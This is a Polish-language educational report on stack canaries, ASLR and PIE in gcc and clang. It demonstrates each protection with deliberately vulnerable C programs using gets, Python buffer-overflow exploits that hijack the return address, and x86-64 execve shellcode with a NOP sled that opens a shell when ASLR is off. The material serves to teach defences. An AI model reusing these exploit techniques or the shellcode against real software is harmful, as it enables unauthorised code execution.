## <p align=center> Badanie rozwiązań chroniących natywne aplikacje działające w trybie użytkownika </p>


#### Spis treści 

1. [Wstęp](#wstep)
2. [Kanarki stosu](#kanarki)
    1. [Rodzaje kanarków](#rodzaje_kanarkow)
    2. [Implementacja w kompilatorach (gcc i clang)](#implementacja_kanarkow)
    3. [Zastosowanie  w praktyce](#zastosowanie_kanarkow)
    4. [Wady i zalety](#wady_zalety_kanarki)
3. [ASLR](#aslr)
    1. [Linux a Windows](#linux_windows)
    2. [Zastosowanie w praktyce](#zastosowanie_aslr)
    3. [Wady i zalety](#wady_zalety_aslr)
4. [PIE](#pie)
    1. [Implementacja na architekturach x32 i x64](#implementacja_architektury)
    2. [Implementacja w kompilatorach (gcc i clang)](#kompilatory_pie)
    3. [Zastosowanie w praktyce](#zastosowanie_pie)
    4. [Wady i zalety](#wady_zalety_pie)
5. [Wnioski](#wnioski)  

&nbsp; &nbsp; &nbsp;

### Wstęp <a name="wstep"></a>
W 1996 roku w magazynie Phrack ukazał się artykuł "Smashing The Stack From Fun and Profit", w którym przedstawione zostały podstawy eksploitacji binarnej. W tym artykule nie zostało odkryte nic nowego, a mimo to okazał się on punktem przełomowym, ponieważ pokazał on ludziom, jak łatwa była wtedy eklsploitacja binarna i jakie można było za jej pomocą odnieść korzyści. Spowodowało to dużo większe zainteresowanie tematem, które poskutkowało znacznym wzrostem eksploitacji takich podatności. Od tego momentu rozpoczął się wyścig zbrojeń pomiędzy atakującymi, a projektantami zabezpieczeń. Efektem tych działań jest zarówno wiele ataków na skalę światową takich jak *Morris Worm (1998)*, *Code Red (2001)*, *SQL Slammer Worm (2003)*, jak i powstanie szerokiej gamy zabezpieczeń ("utrudniaczy") przed przepełnieniami bufora. Można do nich zaliczyć między innymi kanarki stosu, ASLR oraz PIE i w to właśnie te zabezpieczenia opiszę w tym tekście.

<div style="page-break-after: always;"></div>

### Kanarki stosu <a name="kanarki"></a>
Kanarki stosu (ang. *stack canaries*)  są jednym ze sposobów zapobiegania atakom bazującym na przepełnieniu bufora. Bez wchodzenia w szczegóły i różnice pomiędzy implementacjami, kanarek stosu jest to pewna wartość umieszczana przez kompilator na stosie pomiędzy buforem a wskaźnikiem ramki stosu `SFP`. Później wartość kanarka jest porównywana z oryginalną i jeśli została zmieniona, to program kończy swoje działanie. Na schemacie poniżej widać, że gdyby atakujący chciał nadpisać na przykład adres powrotny funkcji `RET`, to po drodze również nadpisze i (najprawdopodobniej) zmieni wartość kanarka, co zostanie wykryte zaraz przed powrotem funkcji. W takim wypadku działanie programu zostanie zatrzymane, a co za tym idzie nie zostaną wykonane instrukcje, na które wskazywał nadpisany `RET`. 

```
---+------------+------------+------------+------------+------------+---				
   |          bufor          |   kanarek  |     SFP    |     RET    |  
---+------------+------------+------------+------------+------------+---
```

##### Rodzaje kanarków <a name="rodzaje_kanarkow"></a>

Daje się wyróżnić cztery kategorie kanarków:

- **Random Canary**
  Założenie przy tworzeniu tego kanarka było takie, że eksploit może kolejno wpisywać dowolne wartości na stos. Dlatego wartość takiego kanarka zostaje wylosowana (przez /dev/radnom lub /dev/urandom na systemach Linux) w chwili wywołania programu, co zmusza atakującego do zgadywania wartości kanarka, którego długość w zależności od systemu operacyjnego może wynosić 32 lub 64 bity. Warto dodać, że najczęściej pierwsze 8 bitów jest składa się na `null byte`, co utrudnia ataki polegające na operowaniu ciągami znaków. Takie rozwiązanie jednak ma swoje wady, ponieważ w wypadku systemów 32-bitowych, losowane są tylko 24 bity, co może w niektórych przypadkach pozwolić na odgadnięcie wartości kanarka poprzez atak brute force.  

- **Random XOR Canary**
  Tym razem założono, że eksploit może mieć dostęp do losowego miejsca w pamięci, gdzie znajdują się chronione dane. Efektem jest, podobnie jak w poprzednim przypadku, losowanie wartości w trakcie wywołania programu, jednak tym razem zostaje ona dodatkowo przemieszana poprzez zastosowanie operacji XOR z takimi danymi, jak na przykład `SFP` lub `RET`. Dzięki temu, nawet gdy uda się odtworzyć oryginalną wartość kanarka, to nadpisanie adresu powrotu i tak zakończy działanie programu.

- **Terminator Canary**
  Wartość tego typu kanarków jest znana i składa się z takich bajtów jak `NULL(0x00)`, `LF(0x0a)` - *line feed*, `CR(0x0d) `- *carriage return*, `EOF(0xff)` - *end of file*. Jak można się domyślić po wymienionych wcześniej bajtach, ten typ kanarka ma na celu przeciwdziałanie jednym z częstszych ataków - polegającym na operowaniu ciągami znaków.  W założeniu te 4 bajty powinny zakończyć działanie większości podatnych funkcji operujących na ciągach znaków  (np. `gets`, `strcpy`, `read` ) i tym sposobem udaremnić atak. Taki kanarek jest jednak nieskuteczny, gdy atakujący może nadpisywać wartość kanarka wielokrotnie - wystarczy wtedy, że nadpisze on jakieś chronione dane (np. `RET`), a potem odtworzy wartość kanarka poprzez wpisywanie kolejnych wartości w jego miejsce.
  
- **Null Canary**
  Jest to najprostsza implementacja tego zabezpieczenia, w której kanarek jest po prostu ciągiem 4 lub 8 null bajtów. Podobnie jak poprzedni typ ma to na celu utrudnić ataki manipulujące ciągami znaków. 
##### Implementacja w kompilatorach (gcc i clang) <a name="implementacja_kanarkow"></a>

Kanarki stosu zostały po raz pierwszy przedstawione przez gcc w 1998 r. jako część narzędzia *StackGuard*. Oryginalnie polegało to na umieszczeniu losowej liczby (random canary) na stosie przed adresem powrotu funkcji. Projekt zaczął się rozwijać i wkrótce dodano do niego również *random xor canaries* oraz *terminator canaries*. Kolejną istotną zmianą było przeniesienie kanarka przed wskaźnik ramki stosu oraz wprowadzenie nowego układu zmiennych na stosie, tak aby zmienne lokalne i wskaźniki znajdowały się przed buforem. Dzięki temu przepełnienie bufora było od razu wykrywane nie narażając integralności zmiennych lokalnych.     

Na ten moment implementacja kanarków stosu jest prawie identyczna w gcc i clang, dlatego poniższe informacje odnoszą się do obydwu kompilatorów.   

W trakcie kompilacji można zastosować różne tryby zabezpieczania stosu:

- `-fstack-protector` - Dodanie kanarków tylko do funkcji wykorzystujących funkcję `alloca` (służy do przydzielania pamięci na stosie) oraz takich, gdzie bufor jest większy lub równy rozmiarowi *ssp-buffer-size* (domyślnie 8 bajtów).  
- `-fstack-protector-all` - Dodanie kanarków do każdej funkcji (obniża wydajność).
- `-fstack-protector-strong` - Kompromis pomiędzy wyżej wymienionymi trybami. Dodanie kanarków do funkcji zawierających tablicę dowolnego rozmiaru, wykorzystujących funkcję `alloca` lub pobierających adres zmiennej lokalnej.   
- `-fstack-protector-explicit` - Tak jak `-fstack-protector`, ale dodaje kanarki tylko do funkcji zaznaczonych  atrybutem `stack_protect`.
- `-fno-stack-protector` - wyłączenie zabezpieczenia

##### Zastosowanie  w praktyce <a name="zastosowanie_kanarkow"></a>

W celu prezentacji działania kanarków stosu napisałem prosty program w C. Jak widać poniżej, zastosowana została podatna funkcja `gets`, która nie sprawdza długości wczytywanego ciągu znaków. W kodzie dodatkowo umieściłem zmienną `some_variable` oraz funkcję `malicious`. Poniższy kod skompilowałem w dwóch wersjach za pomocą gcc w wersji 10.2.0. Za pierwszym razem z flagą `-fno-stack-protector`, a potem z `-fstack-protector` w celu dodania kanarków stosu. Moim zadaniem będzie napisanie takiego eksploita, aby nadpisać wartość zmiennej `some_variable` oraz wykonać funkcję `malicious`. 

<font size=1>

```c
#include <stdio.h>
#include <stdlib.h>

void malicious() { printf("Code flow changed!!!\n"); }

int main(int argc, char **argv) {
  volatile int some_variable;
  char buffer[64];

  some_variable = 7;
  gets(buffer);

  if (some_variable != 7) {
    printf("Local variable modified!!!\n");
  }

  return 0;
}
```

</font>

Poniższy eksploit generuje ciąg znaków, który dzięki przepełnieniu bufora powinien nadpisać zmienną `some_variable` wartością `variable` oraz przekierować wykonanie kodu do adresu `0x401156`, czyli miejsca, w którym znajduje się funkcja `malicious`. 

<font size=1>

```python
import sys
import struct

buffor = b'\x41'*64
padding = b'\x42'*12
variable = b'\x43'*4
rbp = b'\x44'*8
ret = 0x401156

sys.stdout.buffer.write(buffor)
sys.stdout.buffer.write(padding)
sys.stdout.buffer.write(variable)
sys.stdout.buffer.write(rbp)
sys.stdout.buffer.write(struct.pack("Q", ret))
```

</font>

Testy zacząłem od programu skompilowanego bez zabezpieczeń. Jak widać na wydruku z terminala, eksploit wykonał swoje zadanie i nic nie stanęło na jego drodze. Przepełnienie bufora nadpisało odpowiednią zmienną oraz adres powrotu funkcji, który teraz wskazywał na funkcję  `malicious`. Komunikat `Segmentation fault (core dumped)` nie oznacza nawet ostrzeżenia o ewentualnym wykryciu przepełnienia bufora, a jedynie informuje, że nie udało się wykonać instrukcji, na którą wskazywał instruction pointer po wykonaniu funkcji `malicious`. 

<font size=1>

```
mb@ubuntu:~/Desktop/projekt_bso/StackCanaries$ python3 exploit.py | ./unsafe
Local variable modified!!!
Code flow changed!!!
Segmentation fault (core dumped)
```

</font>

Na poniższym wydruku widać fragment stosu przed i po wywołaniu funkcji `gets`. Tak jak można się było spodziewać, zmienna `some_variable` została umieszona na stosie za buforem, a za bezpośrednio za nią znajdowały się `SFP` i `RET`. 

<font size=1>

```assembly
=> 0x401193 <main+38>:	callq  0x401060 <gets@plt>
0x7fffffffdfb0:	0x00007fffffffe108	0x00000001000000c2 
0x7fffffffdfc0:	0x00007fffffffdfe7	0x00007ffff7e83b4c # -| 
0x7fffffffdfd0:	0x00007fffffffe030	0x000000000040120d #  | bufor
0x7fffffffdfe0:	0x0000000000000000	0x0000000000000000 #  |
0x7fffffffdff0:	0x00000000004011c0	0x0000000000401070 # -|
0x7fffffffe000:	0x00007fffffffe100	0x0000000700000000 #
#                                     ^^^^^^^^ <- some_variable (4 bajty)
0x7fffffffe010:	0x00000000004011c0	0x00007ffff7df3cb2
#        SFP -> ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^ <- RET

Breakpoint 1, 0x0000000000401193 in main ()
(gdb) c
Continuing.
=> 0x401198 <main+43>:	mov    -0x4(%rbp),%eax
0x7fffffffdfb0:	0x00007fffffffe108	0x00000001000000c2 
0x7fffffffdfc0:	0x4141414141414141	0x4141414141414141 # -|
0x7fffffffdfd0:	0x4141414141414141	0x4141414141414141 #  | bufor
0x7fffffffdfe0:	0x4141414141414141	0x4141414141414141 #  |
0x7fffffffdff0:	0x4141414141414141	0x4141414141414141 # -|
0x7fffffffe000:	0x4242424242424242	0x4343434342424242 
#                                     ^^^^^^^^ <- some_variable (4 bajty)
0x7fffffffe010:	0x4444444444444444	0x0000000000401156 #
#        SFP -> ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^ <- RET

Breakpoint 2, 0x0000000000401198 in main ()
```

</font>

------

Teraz spróbuję osiągnąć ten sam efekt stosując eksploit na programie skompilowanym z kanarkami stosu. Warto na początek zajrzeć do debuggera, aby zobaczyć, jak tym razem wygląda stos. Na wydruku poniżej widać stan stosu po wykonaniu funkcji `gets`, która zapisała (tylko!) bufor znakami `A`. Dzięki temu widać dokładnie, gdzie znajduje się bufor. Zgodnie z oczekiwaniami zmienna lokalna `some_variable` została umieszczona przed buforem, co zabezpiecza ją przed nadpisaniem przy przepełnieniu bufora. Najważniejsze jest jednak to, co znajduje się przed wskaźnikiem ramki stosu - kanarek. Łatwo go odnaleźć, ponieważ zaczyna się bajtem `0x00`.  

<font size=1>

```assembly
=> 0x4011c7 <main+58>:	mov    -0x54(%rbp),%eax
0x7fffffffdfa0:	0x00007fffffffe108	0x0000000100000000 
0x7fffffffdfb0:	0x0000000000f0b5ff	0x00000007000000c2  
#                                     ^^^^^^^^ <- some_variable (4 bajty)  
0x7fffffffdfc0:	0x4141414141414141	0x4141414141414141 # -|
0x7fffffffdfd0:	0x4141414141414141	0x4141414141414141 #  | bufor
0x7fffffffdfe0:	0x4141414141414141	0x4141414141414141 #  |
0x7fffffffdff0:	0x4141414141414141	0x4141414141414141 # -|
0x7fffffffe000:	0x00007fffffffe100	0xd648704df8fd3c00    
#                                   ^^^^^^^^^^^^^^^^^^ <- kanarek!
0x7fffffffe010:	0x0000000000401200	0x00007ffff7df3cb2   
#        SFP -> ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^ <- RET
```

</font>

Ponieważ układ na stosie trochę się zmienił, to dostosuję eksploit tak, aby dać mu "szansę" zadziałać. Zmiany polegają, między innymi, na dopasowaniu długości paddingu, dodaniu wartości dla kanarka i zmiany adresu funkcji `malicious`. Z założenia nie znam wartości kanarka, dlatego nadpiszę go po prostu ośmioma bajtami `0x45`. 

<font size=1>

```python
import sys
import struct

buffor = b'\x41'*64
padding = b'\x42'*8
canary = b'\x45'*8
rbp = b'\x44'*8
ret = 0x401176

sys.stdout.buffer.write(buffor)
sys.stdout.buffer.write(padding)
sys.stdout.buffer.write(canary)
sys.stdout.buffer.write(rbp)
sys.stdout.buffer.write(struct.pack("Q", ret))
```

</font>

Nie jest zaskoczeniem, że eksploit nie przyniósł zamierzonych efektów - została wykryta zmiana kanarka i nie doszło do powrotu funkcji, po którym wskaźnik instrukcji wskazywałby na funkcję `malicious`. 

<font size=1>

```
mb@ubuntu:~/Desktop/projekt_bso/StackCanaries$ python3 exploit.py | ./protected 
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

</font>

Podobnie jak w poprzednim przykładzie, dla formalności, można wyświetlić interesujący nas fragment stosu przed i po wykonaniu funkcji `gets`. Jak widać na wydruku poniżej, wartość kanarka została nadpisana.

<font size=1>

```assembly
=> 0x4011c2 <main+53>:	callq  0x401080 <gets@plt>
0x7fffffffdfa0:	0x00007fffffffe108	0x0000000100000000
0x7fffffffdfb0:	0x0000000000f0b5ff	0x00000007000000c2
#                                     ^^^^^^^^ <- some_variable (4 bajty)
0x7fffffffdfc0:	0x00007fffffffdfe7	0x00007ffff7e83b4c # -|
0x7fffffffdfd0:	0x00007fffffffe030	0x000000000040124d #  | bufor
0x7fffffffdfe0:	0x0000000000000000	0x0000000000000000 #  | 
0x7fffffffdff0:	0x0000000000401200	0x0000000000401090 # -|
0x7fffffffe000:	0x00007fffffffe100	0xe717fbbcfc461a00
#                                   ^^^^^^^^^^^^^^^^^^ <- kanarek
0x7fffffffe010:	0x0000000000401200	0x00007ffff7df3cb2
#        SFP -> ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^ <- RET

Breakpoint 1, 0x00000000004011c2 in main ()
(gdb) c
Continuing.
=> 0x4011c7 <main+58>:	mov    -0x54(%rbp),%eax
0x7fffffffdfa0:	0x00007fffffffe108	0x0000000100000000
0x7fffffffdfb0:	0x0000000000f0b5ff	0x00000007000000c2
#                                     ^^^^^^^^ <- some_variable (4 bajty)
0x7fffffffdfc0:	0x4141414141414141	0x4141414141414141 # -|
0x7fffffffdfd0:	0x4141414141414141	0x4141414141414141 #  | bufor
0x7fffffffdfe0:	0x4141414141414141	0x4141414141414141 #  |
0x7fffffffdff0:	0x4141414141414141	0x4141414141414141 # -|
0x7fffffffe000:	0x4242424242424242	0x4545454545454545
#                                   ^^^^^^^^^^^^^^^^^^ <- kanarek!
0x7fffffffe010:	0x4444444444444444	0x0000000000401176
#        SFP -> ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^ <- RET

Breakpoint 2, 0x00000000004011c7 in main ()
```

</font>

Na koniec warto zobaczyć różnice w funkcji dezasemblowanej funkcji `main` obydwu programów. Dodatkowe instrukcje, które pojawiły się po skompilowaniu programu z kanarkami, wyróżniłem wcięciem na początku oraz opisałem w komentarzu. 

<div style="page-break-after: always;"></div>

<font size=1>

```assembly
<+0>:	endbr64 
<+4>:	push   rbp
<+5>:	mov    rbp,rsp
<+8>:	sub    rsp,0x70
<+12>:	mov    DWORD PTR [rbp-0x64],edi
<+15>:	mov    QWORD PTR [rbp-0x70],rsi
	<+19>:	mov    rax,QWORD PTR fs:0x28			# wstawienie kanarka ze zmiennej globalnej do rejestru rax
	<+28>:	mov    QWORD PTR [rbp-0x8],rax			# wstawienie kanarka z rejestru rax na stos
<+32>:	xor    eax,eax
<+34>:	mov    DWORD PTR [rbp-0x54],0x7
<+41>:	lea    rax,[rbp-0x50]
<+45>:	mov    rdi,rax
<+48>:	mov    eax,0x0
<+53>:	call   0x401080 <gets@plt>
<+58>:	mov    eax,DWORD PTR [rbp-0x54]
<+61>:	cmp    eax,0x7
<+64>:	je     0x4011db <main+78>
<+66>:	lea    rdi,[rip+0xe43]        
<+73>:	call   0x401060 <puts@plt>
<+78>:	mov    eax,0x0
	<+83>:	mov    rdx,QWORD PTR [rbp-0x8]			# wstawienie kanarka ze stosu do rejestru rdx
	<+87>:	sub    rdx,QWORD PTR fs:0x28			# porównanie wartości rejestru rdx z kanarkiem w zmiennej globalnej
	<+96>:	je     0x4011f4 <main+103>				# gdy są takie same to przejście do instrukcji leave 
	<+98>:	call   0x401070 <__stack_chk_fail@plt>	# w przeciwnym wypadku wykonanie funkcji__stack_chk_fail i zakończenie działania programu
<+103>:	leave  
<+104>:	ret
```

</font>

##### Wady i zalety <a name="wady_zalety_kanarki"></a>

Kanarki stosu nie są rozwiązaniem na wszystkie problemy, ale na pewno potrafią zminimalizować skutki klasycznego przepełnienia bufora i ze względu na prostą implementację oraz mały wpływ na wydajność programu, nie ma powodu, aby ich nie dodawać. Dodatkową zaletą kanarków jest fakt, że wykrywają one próbę ataku i dzięki temu można, w jakiś sposób, zareagować. Nie można jednak korzystać z podatnych funkcji i polegać na tym, że kanarki zabezpieczą program, ponieważ jest wiele sposobów na ich obejście. Przykładowo jeśli atakujący doprowadzi do sytuacji, w której może czytać pamięć, to odnalezienie wartości kanarka nie stanowi żadnego problemu. Kolejnym sposobem na przełamanie tego zabezpieczenia jest, po prostu, znalezienie kanarka dzięki atakowi brute force (szczególnie na 32-bitowych systemach). Jest to możliwe, ponieważ w przypadku "*forkowania*" programu dzieci mają taki sam kanarek jak rodzic, a taka sytuacja jest często spotykana w aplikacjach sieciowych. 

<div style="page-break-after: always;"></div>


### ASLR  <a name="aslr"></a>

ASLR, czyli *Address Space Layout Randomization* jest techniką zabezpieczania systemu przed eksploitacją podatności związanych z manipulacją pamięcią. Zabezpieczenie to polega na losowaniu w pamięci miejsca do ulokowania procesu, a następnie losowego rozmieszczania bibliotek, sterty oraz stosu wewnątrz przestrzenie adresowej procesu. Takie rozwiązanie znacznie utrudnia atakującemu skakanie do wybranych miejsc w pamięci procesu, ponieważ adresy będą się zmieniały co wykonanie programu. 

##### Linux a Windows <a name="linux_windows"></a>

ASLR pojawił się po raz pierwszy na Linuxie w 2005 roku,  a w 2014 roku dołączył do niego KASLR  - czyli wersja ASLR dla jądra systemu Linux. Na Windowsy ASLR zawitał razem z Windows Vista w 2007 roku. Na obydwu systemach zadanie ASLR jest takie samo, lecz różnice w implementacji są dość znaczące. Problem implementacji ASLR  na Windowsach wywodzi się z tego, że pliki DLL (*Dynamic-Link Library*) nie obsługują PIC (*Position-independent Code*), więc muszą być umieszczone w tym samym miejscu, aby mogły być wykorzystane przez różne procesy. Przez to dopuszczalna jest sytuacja, w której instancje jakiegoś programu zostają umieszczone w tym samym miejscu dla dwóch różnych procesów.  Może to prowadzić do sytuacji, w których można poprzez podatność w jednym programie znaleźć adres interesującej funkcji, a w drugim programie podatnym na przykład na przepełnienie bufora, skoczyć do poznanego adresu. Również, jeśli proces ładuje plik DLL, który był niedawno wykorzystany, to możliwe, że zostanie mu przydzielony ten sam adres co wcześniej. Dopiero ponowne uruchomienie systemu (zabicie wszystkich procesów korzystających z danego pliku DLL) gwarantuje uzyskanie nowego losowego adresu. Dlatego aplikacje restartujące się po wykryciu błędu są podatne na ataki brute force. Powyższe problemy nie występują na Linuxach, ponieważ biblioteki wspierają PIC. 

Na Linuxach ASLR można ustawić poleceniem `sysctl -w kernel.randomize_va_space={tryb}`. Tryby, spośród których można wybierać, przedstawione są w poniższej tabeli. 

<font size=1>

| Tryb | Działanie                                              |
| ---- | ------------------------------------------------------ |
| 0    | ASLR wyłączony                                         |
| 1    | Randomizacja adresów stosu i współdzielonych bibliotek |
| 2    | Dodatkowa randomizacja adresu sterty (domyślny tryb)   |

</font>

##### Zastosowanie w praktyce <a name="zastosowanie_aslr"></a>

W celu zaprezentowania działania ASLR przygotowałem podatny program napisany w języku C, który dla ułatwienia prezentacji skompilowałem bez żadnych zabezpieczeń. Podatność ponownie polega na zastosowaniu funkcji `gets`.

<font size=1>

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
  char buffer[64];
  gets(buffer);
}
```

</font>

Tym razem eksploit polega na przepełnieniu bufora oraz wstawieniu shellcodu (uruchamiającego wiersz poleceń) poprzedzonego dużą ilością instrukcji `nop`. Po drodze nadpisany zostaje adres powrotu funkcji, który teraz będzie wskazywał gdzieś na "zjeżdżalnię" z *nop'ów*. Jak widać adres, do którego ma zostać przekierowanie wykonania programu, został wpisany na sztywno - ten element zawiedzie po uruchomieniu ASLR.

<font size=1>

```python
import struct
import sys

padding = b'\x41'*72
address = 0x00007fffffffe040
nop_sled = b'\x90'*800
shellcode = b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'

sys.stdout.buffer.write(padding)
sys.stdout.buffer.write(struct.pack("Q", address+200))
sys.stdout.buffer.write(nop_sld)
sys.stdout.buffer.write(shellcode)
```

</font>

Najpierw jednak uruchomię program z wyłączonym ASLR. Przy normalnym wykonaniu pogram uruchomił by wiersz poleceń i od razu się wyłączył. Dlatego, aby móc pisać w wierszu poleceń, uruchamiam dodatkowo program `cat`. Jak widać, na wydruku poniżej, eksploit spełnił swoje zadanie.

<font size=1>

```
mb@ubuntu:~/Desktop/projekt_bso/ASLR$ (cat exp; cat) | ./out
     
tree ..
..
|-- ASLR
|   |-- exp
|   |-- exploit.py
|   |-- out
|   `-- vuln.c
`-- StackCanaries
    |-- exploit.py
    |-- protected
    |-- unsafe
    `-- vuln.c

2 directories, 8 files
```

</font>

Teraz czas włączyć ASLR poleceniem `sudo sysctl -w kernel.randomize_va_space=2`. Aby zobaczyć na własne oczy działanie ASLR, wyświetlę za pomocą gdb pamięć dwóch instancji mojego programu. Należy jednak pamiętać, że domyśle gdb wyłącza randomizacje adresów i trzeba tę opcję wyłączyć poleceniem `set disable-randomization off`.

<div style="page-break-after: always;"></div>

<font size=1>

```assembly
                        ####### Proces 1 #######
(gdb) info proc mappings 
process 2312
Mapped address spaces:
          Start Addr           End Addr       objfile
            0x400000           0x401000 /home/mb/Desktop/projekt_bso/ASLR/out
            0x401000           0x402000 /home/mb/Desktop/projekt_bso/ASLR/out
            0x402000           0x403000 /home/mb/Desktop/projekt_bso/ASLR/out
            0x403000           0x404000 /home/mb/Desktop/projekt_bso/ASLR/out
            0x404000           0x405000 /home/mb/Desktop/projekt_bso/ASLR/out
      0x7f433cd92000     0x7f433cd94000 
      0x7f433cd94000     0x7f433cdba000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7f433cdba000     0x7f433cf27000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7f433cf27000     0x7f433cf73000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7f433cf73000     0x7f433cf74000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7f433cf74000     0x7f433cf77000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7f433cf77000     0x7f433cf7a000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7f433cf7a000     0x7f433cf80000 
      0x7f433cf91000     0x7f433cf92000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7f433cf92000     0x7f433cfb6000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7f433cfb6000     0x7f433cfbf000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7f433cfbf000     0x7f433cfc0000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7f433cfc0000     0x7f433cfc2000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7ffd1c210000     0x7ffd1c231000 [stack]
      0x7ffd1c286000     0x7ffd1c28a000 [vvar]
      0x7ffd1c28a000     0x7ffd1c28c000 [vdso]
  0xffffffffff600000 0xffffffffff601000 [vsyscall]
```

```assembly
                        ####### Proces 2 #######
(gdb) info proc mappings
process 2320
Mapped address spaces:
          Start Addr           End Addr       objfile
            0x400000           0x401000 /home/mb/Desktop/projekt_bso/ASLR/out
            0x401000           0x402000 /home/mb/Desktop/projekt_bso/ASLR/out
            0x402000           0x403000 /home/mb/Desktop/projekt_bso/ASLR/out
            0x403000           0x404000 /home/mb/Desktop/projekt_bso/ASLR/out
            0x404000           0x405000 /home/mb/Desktop/projekt_bso/ASLR/out
      0x7f4992f63000     0x7f4992f65000 
      0x7f4992f65000     0x7f4992f8b000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7f4992f8b000     0x7f49930f8000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7f49930f8000     0x7f4993144000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7f4993144000     0x7f4993145000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7f4993145000     0x7f4993148000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7f4993148000     0x7f499314b000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7f499314b000     0x7f4993151000 
      0x7f4993162000     0x7f4993163000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7f4993163000     0x7f4993187000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7f4993187000     0x7f4993190000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7f4993190000     0x7f4993191000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7f4993191000     0x7f4993193000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7ffcd1348000     0x7ffcd1369000 [stack]
      0x7ffcd136b000     0x7ffcd136f000 [vvar]
      0x7ffcd136f000     0x7ffcd1371000 [vdso]
  0xffffffffff600000 0xffffffffff601000 [vsyscall]
```

</font>

Jak widać adresy stosu, vDSO jak i używanych bibliotek różniły się od siebie w obydwu instancjach procesu. Próba uruchomiania eksploitu kończy się niepowodzeniem, ponieważ prawdopodobieństwo trafienia na wstrzyknięty shellcode jest dość małe.

<font size=1>

```
mb@ubuntu:~/Desktop/projekt_bso/ASLR$ (cat exp; cat) | ./out

Segmentation fault (core dumped)
mb@ubuntu:~/Desktop/projekt_bso/ASLR$ (cat exp; cat) | ./out

Segmentation fault (core dumped)
mb@ubuntu:~/Desktop/projekt_bso/ASLR$ (cat exp; cat) | ./out

Segmentation fault (core dumped)
```

</font>

##### Wady i zalety <a name="wady_zalety_aslr"></a>

ASLR stał się już standardem w tych czasach i nie ma powodów, aby z niego rezygnować. Nie jest to oczywiście zaawansowane zabezpieczenie przed eksploitacją binarną, a jedynie prosta w swoim działaniu technika mająca na celu utrudnienie ataku. Należy jednak pamiętać, że sam w sobie ASLR nie jest wystarczający, ponieważ jest podatny na takie ataki jak return-to-plt, nadpisanie `GOT` lub po prostu brute force. Z ASLR można uzyskać dodatkowe korzyści, gdy używa się programów obsługujących PIE.

<div style="page-break-after: always;"></div>  

### PIE <a name="pie"></a>

PIE, czyli *Position-Independent Executable*, jest kolejnym sposobem na utrudnienie eksploitacji pamięci. W dużym uproszczeniu można powiedzieć, że jest to dodatkowe usprawnienie do ASLR. Nie jest to jednak do końca prawda, ponieważ PIE odnosi się do pojedynczego pliku wykonywalnego i jest opcją kompilatora, a nie jak ASLR zabezpieczeniem systemowym. Program skompilowany z obsługą PIE wyróżnia się tym, że w jego kodzie (asemblera) nie występują odwołania do funkcji lub zmiennych poprzez bezwzględne adresy. Jest to możliwe dzięki zastosowaniu adresacji względem `IP` (*instruction pointer*), czyli od miejsca, w którym aktualnie wykonywany jest kod. Taki sposób adresacji pozwala na uruchomienie kodu w dowolnym miejscu w pamięci. Jest to ogromna zaleta, ponieważ dzięki temu ASLR może randomizować adresy nie tylko dla stosu, sterty i bibliotek, ale również dla sekcji kodu oraz `PLT` (*Procedure Linkage Table*).

##### Implementacja na architekturach x32 i x64 <a name="implementacja_architektury"></a>

Pomimo tych samych założeń, implementacja PIE jednak lekko od siebie odbiega na tych dwóch architekturach. W obydwu przypadkach proces adresacji zachodzi w momencie linkowania programu. Natomiast różnice wywodzą się z tego, że procesory 32-bitowe nie były zaprojektowane z myślą o takim sposobie adresacji, przez co odniesienia do danych wymagają bezwzględnych adresów (np. `mov`) oraz nie ma gotowego sposobu na szybkie odczytanie wartości wskaźnika instrukcji, który jest potrzebny do wyliczenia bezwzględnego adresu. Dlatego, w tym celu, stosuje się funkcję pomocniczą, której jedynym zadaniem jest skopiowanie pierwszej wartości ze stosu do rejestru. Tym sposobem, w momencie wywołania tej funkcji, na stosie zostaje zapisany adres powrotu, który następnie zostaje przez funkcję skopiowany do wybranego rejestru. Takie rozwiązanie jest obarczone dodatkowymi instrukcjami dla procesora oraz zarezerwowaniem rejestru, który w przypadku złożonych programów mógłby być kluczowy. Sytuacja prezentuje się lepiej na procesorach 64-bitowych, ponieważ tam zaimplementowano już "*RIP-relative addressing mode*", dzięki któremu wszystkie odniesienia bazują już na adresacji względem `rip`.

